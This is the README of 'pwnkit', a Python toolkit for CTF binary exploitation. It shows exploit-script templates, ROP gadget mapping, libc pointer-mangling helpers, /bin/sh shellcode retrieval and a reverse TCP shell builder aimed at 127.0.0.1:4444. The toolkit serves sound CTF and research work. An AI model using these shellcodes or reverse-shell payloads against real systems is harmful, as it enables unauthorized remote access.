# pwnkit

[![PyPI version](https://img.shields.io/pypi/v/pwnkit.svg)](https://pypi.org/project/pwnkit/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python Versions](https://img.shields.io/pypi/pyversions/pwnkit.svg)](https://pypi.org/project/pwnkit/)

Exploitation toolkit for pwn CTFs & Linux binary exploitation research.  
Includes exploit templates, I/O helpers, ROP gadget mappers, pointer mangling utilities, curated shellcodes, exploit gadgets, House of Maleficarum, gdb/helper scripts, etc.

---

## Installation

From [PyPI](https://pypi.org/project/pwnkit/):

**Method 1**. Install into **current Python environment** (could be system-wide, venv, conda env, etc.). use it both as CLI and Python API:

```bash
pip install pwnkit
```

**Method 2**. Install using `pipx` as standalone **CLI tools**:

```bash
pipx install pwnkit
```

**Method 3.** Install from source (dev):

```bash
git clone https://github.com/4xura/pwnkit.git
cd pwnkit
#
# Edit source code
#
pip install -e .
```

---

## Quick Start

### CLI

All options:
```bash
pwnkit -h
```
Create an exploit script template:
```bash
# local pwn
pwnkit xpl.py --file ./pwn --libc ./libc.so.6 

# remote pwn
pwnkit xpl.py --file ./pwn --host 10.10.10.10 --port 31337

# Override default preset with individual flags
pwnkit xpl.py -f ./pwn -i 10.10.10.10 -p 31337 -A aarch64 -E big

# Minimal setup to fill up by yourself
pwnkit xpl.py
```
Example using default template:
```bash
$ pwnkit exp.py -f ./evil-corp -l ./libc.so.6 \
                -A aarch64 -E big \
                -a john.doe -b https://johndoe.com
[+] Wrote exp.py (template: pkg:default.py.tpl)

$ cat exp.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: john.doe - https://johndoe.com
#
# Description:
# ------------
# A Python exploit for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : python3 xpl.py
# - Remote mode : python3 [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import os, sys

BIN_PATH   = '/home/Axura/ctf/pwn/linux-user/evilcorp/evil-corp'
LIBC_PATH  = '/home/Axura/ctf/pwn/linux-user/evilcorp/libc.so.6'
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], None, None)	# default local mode 

ctx = Context(
    arch      = 'aarch64',
    os        = 'linux',
    endian    = 'big',
    log_level = 'debug',
    terminal  = ('tmux', 'splitw', '-h')	# remove when no tmux sess
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {}
).init().alias()
set_global_io(io)  # s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

def xpl():

    # exploit chain here

    io.interactive()

if __name__ == "__main__":
    xpl()
```
List available built-in templates:
```bash
$ pwnkit -lt
[*] Bundled templates:
   - default
   - got
   - heap
   - minimal
   - ret2libc
   - ret2syscall
   - setcontext
   - srop
   ...
```
Use a built-in template:
```bash
pwnkit exp.py -t heap
```

### Python API

```python
from pwnkit import *
from pwn import *

# - Push a context preset
ctx = Context.preset("linux-amd64-debug")
"""
ctx = Context(
    arch	  = "amd64"
    os		  = "linux"
    endian	  = "little"
    log_level = "debug"
    terminal  = ("tmux", "splitw", "-h")	# remove when no tmux
)
"""
ctx.push()   # applies to pwntools' global context

# - Simple I/O stream
io = Tube(
    file_path = "/usr/bin/sudoedit",
    libc_path = "./libc.so.6",
    host      = "127.0.0.1",
    port	  = 123456,
    env		  = {}
).init().alias()
io.sl(b"hello")
print(io.r(5))  # b'hello'

# - Use io aliases globally
set_global_io(io)
sl(b"hello")
print(r(5))     # b'hello'

# - ROP after leaking libc_base
libc.address = libc_base
ggs 	= ROPGadgets(libc)
p_rdi_r = ggs['p_rdi_r']
p_rsi_r = ggs['p_rsi_r']
p_rax_r = ggs['p_rax_r']
p_rsp_r = ggs['p_rsp_r']
p_rdx_rbx_r = ggs['p_rdx_rbx_r']
leave_r = ggs['leave_r']
ret 	= ggs['ret']
...

# - libc Pointer protection
# 1) Pointer guard
guard = 0xdeadbeef	# leak it or overwrite it
pg = PointerGuard(guard)
ptr = 0xcafebabe
enc_ptr = pg.mangle(ptr)
dec_ptr = pg.demangle(enc_ptr)
assert ptr == dec_ptr

# 2) Safe linking 
#    e.g., after leaking heap_base for tcache
slfd = SafeLinking(heap_base)
fd = 0x55deadbeef
enc_fd = slfd.encrypt(fd)
dec_fd = slfd.decrypt(enc_fd)
assert fd == dec_fd

# - Shellcode generation
# 1) List all built-in available shellcodes
for name in list_shellcodes():
    print(" -", name)

# 2) Retrieve by arch + name, default variant (min)
sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
print(hex_shellcode(sc.blob))   # output as hex

# 3) Retrieve explicit variant
sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
print(hex_shellcode(sc.blob))

# 4) Retrieve via composite key
sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
print(f"[+] Got shellcode: {sc.name}")
print(hex_shellcode(sc.blob))

# 5) Fuzzy lookup
sc = ShellcodeReigstry.get("amd64", "ls_")
print(f"[+] Fuzzy match: {sc.name}")
print(hex_shellcode(sc.blob))

# 6) Builder demo: reverse TCP shell (amd64)
builder = ShellcodeBuilder("amd64")
rev = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
print(f"[+] Built reverse TCP shell ({len(rev)} bytes)")
print(hex_shellcode(rev))



...

io.interactive() 
```

---

## Context Presets

Available presets (built-in):

* `linux-amd64-debug`
* `linux-amd64-quiet`
* `linux-i386-debug`
* `linux-i386-quiet`
* `linux-arm-debug`
* `linux-arm-quiet`
* `linux-aarch64-debug`
* `linux-aarch64-quiet`
* `freebsd-amd64-debug`
* `freebsd-amd64-quiet`

---

## Custom Templates

Templates (`*.tpl` or `*.py.tpl`) are rendered with a context dictionary.
Inside your template file you can use Python format placeholders (`{var}`) corresponding to:

 | Key           | Meaning                                                      |
 | ------------- | ------------------------------------------------------------ |
 | `{arch}`      | Architecture string (e.g. `"amd64"`, `"i386"`, `"arm"`, `"aarch64"`) |
 | `{os}`        | OS string (currently `"linux"` or `"freebsd"`)               |
 | `{endian}`    | Endianness (`"little"` or `"big"`)                           |
 | `{log}`       | Log level (e.g. `"debug"`, `"info"`)                         |
 | `{term}`      | Tuple of terminal program args (e.g. `("tmux", "splitw", "-h")`) |
 | `{file_path}` | Path to target binary passed with `-f/--file`                |
 | `{libc_path}` | Path to libc passed with `-l/--libc`                         |
 | `{host}`      | Remote host (if set via `-i/--host`)                         |
 | `{port}`      | Remote port (if set via `-p/--port`)                         |
 | `{io_line}`   | Pre-rendered code line that initializes the `Tube`           |
 | `{author}`    | Author name from `-a/--author`                               |
 | `{blog}`      | Blog URL from `-b/--blog`                                    |

Use your own custom template (`*.tpl` or `*.py.tpl`):
```bash
pwnkit exp.py -t ./mytpl.py.tpl
```
Or put it in a directory and point `PWNKIT_TEMPLATES` to it:
```bash
export PWNKIT_TEMPLATES=~/templates
pwnkit exploit.py -t mytpl
```
For devs, you can also place your exploit templates (which is just a Python file of filename ending with `tpl` suffix) into [`src/pwnkit/templates`](https://github.com/4xura/pwnkit/tree/main/src/pwnkit/templates), before cloning and building to make a built-in. You are also welcome to submit a custom template there in this repo for a pull request!

---

## TODO

* Move the template feature under mode `template`
* Create other modes (when needed)
* Fill up built-in exploit tempaltes
* More Python exloit modules, e.g., decorators, heap exploit, etc.

